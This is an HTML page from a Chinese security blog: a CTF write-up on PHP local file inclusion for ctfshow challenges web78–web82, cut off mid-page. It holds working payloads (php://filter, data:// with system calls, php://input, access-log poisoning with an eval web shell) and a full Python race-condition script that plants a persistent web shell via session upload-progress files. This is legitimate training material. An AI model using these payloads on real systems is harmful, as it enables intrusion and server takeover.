@@ -1,0 +1,881 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="MaskObito">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="本地文件包含漏洞（LFI, Local File Inclusion）web781234567&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123;    $file &#x3D; $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&amp;#12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含">
+<meta property="og:url" content="http://maskobito.github.io/2025/01/06/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="MaskObito">
+<meta property="og:description" content="本地文件包含漏洞（LFI, Local File Inclusion）web781234567&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123;    $file &#x3D; $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&amp;#12">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5Cweb82-1.png">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5Cweb82-2.png">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5Cweb82-3.png">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5Cweb87.png">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5Cweb88-1.png">
+<meta property="og:image" content="http://maskobito.github.io/%5Cimages%5Cweb88-2.png">
+<meta property="article:published_time" content="2025-01-06T13:40:11.000Z">
+<meta property="article:modified_time" content="2025-09-24T06:49:16.712Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF靶场">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://maskobito.github.io/%5Cimages%5Cweb82-1.png">
+  
+  
+  
+  <title>文件包含 - MaskObito</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/neon.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"maskobito.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[],"type":"particle"},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"language":"zh-CN","enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title">MaskObito</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>信息安全</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>CTF</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于本站</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="文件包含"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-06 21:40" pubdate>
+          2025年1月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">文件包含</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="本地文件包含漏洞（LFI-Local-File-Inclusion）"><a href="#本地文件包含漏洞（LFI-Local-File-Inclusion）" class="headerlink" title="本地文件包含漏洞（LFI, Local File Inclusion）"></a>本地文件包含漏洞（LFI, Local File Inclusion）</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>1.&#x2F;?file&#x3D;..&#x2F;..&#x2F;flag.php 报错的原因:</strong></p>
+<p> <em><strong>Warning</strong>:  include(&#x2F;…&#x2F;www&#x2F;html&#x2F;index.php): failed to open stream: No such file or directory in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>17</strong></em></p>
+<p> <em><strong>Warning</strong>:  include(): Failed opening ‘&#x2F;…&#x2F;www&#x2F;html&#x2F;index.php’ for inclusion (include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’) in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>17</strong></em></p>
+<p><strong>路径问题</strong>：..&#x2F;..&#x2F;flag.php 是相对路径，表示”向上两级目录中的flag.php”</p>
+<p><strong>安全机制</strong>：PHP的 open_basedir 限制会阻止访问系统文件（常见于CTF环境）</p>
+<p><strong>路径转换</strong>：PHP将相对路径转为绝对路径时，超出允许范围的路径会被替换为 &#x2F;…&#x2F;（安全占位符）</p>
+<p><strong>根本原因</strong>：实际路径可能是 &#x2F;var&#x2F;www&#x2F;..&#x2F;..&#x2F;flag.php → 解析为 &#x2F;flag.php（根目录），而服务器禁止访问根目录</p>
+<p><strong>关键点</strong>：这不是文件不存在，而是路径被安全机制拦截</p>
+<p><strong>2.&#x2F;?file&#x3D;flag.php 显示空白的原因:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// flag.php 实际内容</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;ctfshow&#123;...&#125;&quot;</span>;  <span class="hljs-comment">// 没有输出语句！</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>include机制</strong>：当包含 .php 文件时，PHP会执行其中的代码，而非显示源码</p>
+<p><strong>执行而非读取</strong>：</p>
+<p>​    include(“flag.php”) 会执行 $flag&#x3D;”…” 的赋值操作</p>
+<p>​    但该文件没有 echo&#x2F;print 语句 → 无任何输出</p>
+<p>​    赋值操作在内存中完成，浏览器不可见</p>
+<p><strong>空白页面</strong> &#x3D; 包含成功 + 文件无输出内容</p>
+<p><strong>3.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php成功的原因：</strong></p>
+<p><strong>绕过执行</strong>：</p>
+<p>​    php:&#x2F;&#x2F;filter 将文件视为数据流而非代码</p>
+<p>​    resource&#x3D;flag.php 指定读取目标文件</p>
+<p><strong>编码转换</strong>：</p>
+<p>​    convert.base64-encode 对文件内容进行Base64编码</p>
+<p>​    将二进制数据转为纯ASCII字符（A-Z a-z 0-9 +&#x3D;）</p>
+<p><strong>安全输出</strong>：</p>
+<p>​    编码后的内容不包含 <?php ?> 等标签</p>
+<p>​    PHP引擎将其视为普通文本而非代码 → 直接输出到页面</p>
+<p><strong>最终结果</strong>：</p>
+<p>​    页面显示Base64编码的源码：PD9waHAgJGZsYWc9ImN0ZnNob3d7…</p>
+<p>​    解码后得到原始代码</p>
+<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);</em> </p>
+<p>改用base64编码php即可(没有&#x2F;i可以用大小写绕过)</p>
+<p>获取flag： ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p>
+<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p><em>$file &#x3D; str_replace(“php”, “???”, $file);   $file &#x3D; str_replace(“data”, “???”, $file);</em> </p>
+<p>用input协议，?file&#x3D;Php:&#x2F;&#x2F;input，抓post包，把post改成php语句即可运行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>也可以直接大小写绕过</p>
+<h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>可以不用伪协议，开始写马</p>
+<p>在响应头的server中看见服务器为nginx，包含 nginx 访问日志记录：<strong>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p>
+<p>Apache 默认的 combined 日志格式会 原样记录 User-Agent 字符串，不会进行 URL 解码或过滤特殊字符。所以我们改UA。直接添加<?php eval($_GET[2]);?></p>
+<p>get改成**?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;2&#x3D;system(‘tac fl0g.php’);**抓个get包，复制第一行替换原日志第一行即可获得flag</p>
+<h3 id="web82-条件竞争"><a href="#web82-条件竞争" class="headerlink" title="web82(条件竞争)"></a>web82(条件竞争)</h3><p>过滤了.</p>
+<p>php中唯一能控制的无后缀的只有session文件</p>
+<p><img src="/%5Cimages%5Cweb82-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果从cookie里添加PHPSESSID，值为aaa，临时目录下会生成文件**&#x2F;tmp&#x2F;sess_aaa**。</p>
+<p>控制文件内容用参数<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>(获取实时文件上传进度)</p>
+<p>如PHP_SESSION_UPLOAD_PROGRESS&#x3D;”3” &#x3D;&gt; sess_aaa&#x3D;3</p>
+<p><strong>file_put_contents() 函数</strong>：</p>
+<ul>
+<li>这是PHP的一个内置函数</li>
+<li>作用：将内容写入文件（类似保存文件的操作）</li>
+<li>语法：<code>file_put_contents(文件名, 要写入的内容)</code></li>
+<li>示例：<code>file_put_contents(&#39;test.txt&#39;, &#39;Hello World&#39;)</code> 会创建一个test.txt文件，内容为”Hello World”</li>
+</ul>
+<p>写脚本（<strong>已经考虑到了先销毁再包含的情况）</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 用于多线程操作</span><br><span class="hljs-keyword">import</span> io  <span class="hljs-comment"># 用于创建内存中的文件对象</span><br><br>url = <span class="hljs-string">&quot;http://e49655b6-8783-497c-a049-8daf3c8e02dc.challenge.ctf.show/&quot;</span><br>sessionid = <span class="hljs-string">&#x27;ctfshow&#x27;</span><br>data = &#123; <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br><span class="hljs-comment"># read()中需要post的内容</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res = session.post(url,<br>            data=&#123;<br>            <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>        <span class="hljs-comment"># 改参数的值就是/tmp/sess_rikka文件的内容</span><br>            &#125;,<br>            cookies=&#123;<br>            <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid<br>            &#125;,<br>            files=&#123;<br>            <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>, fileBytes)<br>            &#125;<br>            )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res1 = session.post(url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid, data=data, cookies=&#123; <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid &#125;)<br>        res2 = session.get(url+<span class="hljs-string">&#x27;2.php&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event() <span class="hljs-comment"># 开启多线程的对象</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>): <span class="hljs-comment"># 开5个线程</span><br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    event.<span class="hljs-built_in">set</span>()<br><br></code></pre></td></tr></table></figure>
+
+<p>50KB文件确保上传时间足够长（约几秒），这样攻击者有时间在文件被清空前利用它 </p>
+<p>结果是+++done+++，说明成功，访问&#x2F;2.php，</p>
+<p><img src="/%5Cimages%5Cweb82-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试post</p>
+<p><img src="/%5Cimages%5Cweb82-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功。下面详细讲解：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 用于多线程操作</span><br><span class="hljs-keyword">import</span> io  <span class="hljs-comment"># 用于创建内存中的文件对象</span><br><br><span class="hljs-comment"># 目标网站的URL</span><br>url = <span class="hljs-string">&quot;http://e49655b6-8783-497c-a049-8daf3c8e02dc.challenge.ctf.show/&quot;</span><br><br><span class="hljs-comment"># 自定义的Session ID，用于控制Session文件名</span><br>sessionid = <span class="hljs-string">&#x27;ctfshow&#x27;</span><br><br><span class="hljs-comment"># 要执行的恶意PHP代码</span><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>data 解释</strong>：</p>
+<ul>
+<li><code>&quot;1&quot;</code>：这是POST参数名</li>
+<li>值是一个PHP代码字符串：<code>file_put_contents(&#39;/var/www/html/2.php&#39;,&#39;&lt;?php eval($_POST[2]);?&gt;&#39;);</code></li>
+<li>这行代码的意思是：在服务器的<code>/var/www/html/</code>目录创建<code>2.php</code>文件</li>
+<li>文件内容：<code>&lt;?php eval($_POST[2]);?&gt;</code>（这是一个Webshell）</li>
+<li><code>eval($_POST[2])</code> 表示执行通过POST参数<code>2</code>发送的任何PHP代码</li>
+</ul>
+<hr>
+<h4 id="写线程函数（负责污染Session文件）"><a href="#写线程函数（负责污染Session文件）" class="headerlink" title="写线程函数（负责污染Session文件）"></a>写线程函数（负责污染Session文件）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-comment"># 创建一个50KB大小的&quot;假文件&quot;（内容全是字母a）</span><br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 无限循环</span><br>        <span class="hljs-comment"># 发送POST请求上传文件</span><br>        res = session.post(<br>            url,  <span class="hljs-comment"># 目标URL</span><br>            <br>            <span class="hljs-comment"># POST数据部分</span><br>            data=&#123;<br>                <span class="hljs-comment"># 关键！这个值会被写入Session文件</span><br>                <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>            &#125;,<br>            <br>            <span class="hljs-comment"># Cookie设置</span><br>            cookies=&#123;<br>                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid  <span class="hljs-comment"># 设置Session ID</span><br>            &#125;,<br>            <br>            <span class="hljs-comment"># 上传的文件</span><br>            files=&#123;<br>                <span class="hljs-comment"># 文件字段名：&#x27;file&#x27;</span><br>                <span class="hljs-comment"># 文件名：&#x27;ctfshow.jpg&#x27;</span><br>                <span class="hljs-comment"># 文件内容：50KB的&#x27;a&#x27;</span><br>                <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>, fileBytes)<br>            &#125;<br>        )<br></code></pre></td></tr></table></figure>
+
+<p><strong>为什么需要大文件？</strong></p>
+<ul>
+<li>PHP只在上传过程中保持Session文件打开</li>
+<li>50KB文件确保上传时间足够长（约几秒）</li>
+<li>这样攻击者有时间在文件被清空前利用它</li>
+</ul>
+<p><strong>Session文件如何被污染？</strong></p>
+<ol>
+<li>设置Cookie: <code>PHPSESSID=ctfshow</code></li>
+<li>开始上传文件</li>
+<li>PHP自动创建文件：<code>/tmp/sess_ctfshow</code></li>
+<li>将<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值写入该文件</li>
+<li>文件内容变为：<code>upload_progress_&lt;?php eval($_POST[1]);?&gt;</code></li>
+</ol>
+<hr>
+<h4 id="读线程函数（负责执行恶意代码）"><a href="#读线程函数（负责执行恶意代码）" class="headerlink" title="读线程函数（负责执行恶意代码）"></a>读线程函数（负责执行恶意代码）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 无限循环</span><br>        <span class="hljs-comment"># 第一步：触发文件包含漏洞执行恶意代码</span><br>        res1 = session.post(<br>            <span class="hljs-comment"># 利用文件包含漏洞：?file=/tmp/sess_ctfshow</span><br>            url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid,<br>            <br>            <span class="hljs-comment"># 发送要执行的代码</span><br>            data=data,  <span class="hljs-comment"># 就是前面定义的创建Webshell的代码</span><br>            <br>            cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid&#125;  <span class="hljs-comment"># 保持同一个Session</span><br>        )<br>        <br>        <span class="hljs-comment"># 第二步：检查Webshell是否创建成功</span><br> <br>        res2 = session.get(url + <span class="hljs-string">&#x27;2.php&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 如果返回200状态码，说明文件存在</span><br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)  <span class="hljs-comment"># 成功提示</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)  <span class="hljs-comment"># 打印错误代码</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>攻击链解析</strong>：</p>
+<ol>
+<li>请求包含Session文件：<code>?file=/tmp/sess_ctfshow</code></li>
+<li>服务器执行该文件中的PHP代码：<code>eval($_POST[1])</code></li>
+<li><code>$_POST[1]</code>的值是我们发送的：<code>file_put_contents(...)</code></li>
+<li>所以实际执行：<code>file_put_contents(&#39;/var/www/html/2.php&#39;, &#39;&lt;?php eval($_POST[2]);?&gt;&#39;)</code></li>
+<li>在网站根目录创建<code>2.php</code>，内容为Webshell代码</li>
+</ol>
+<hr>
+<h4 id="多线程主程序"><a href="#多线程主程序" class="headerlink" title="多线程主程序"></a>多线程主程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event()  <span class="hljs-comment"># 线程事件对象（实际未使用）</span><br>    <br>    <span class="hljs-comment"># 创建持久会话（自动管理cookies）</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-comment"># 启动5个写线程</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <br>        <span class="hljs-comment"># 启动5个读线程</span><br>        <span 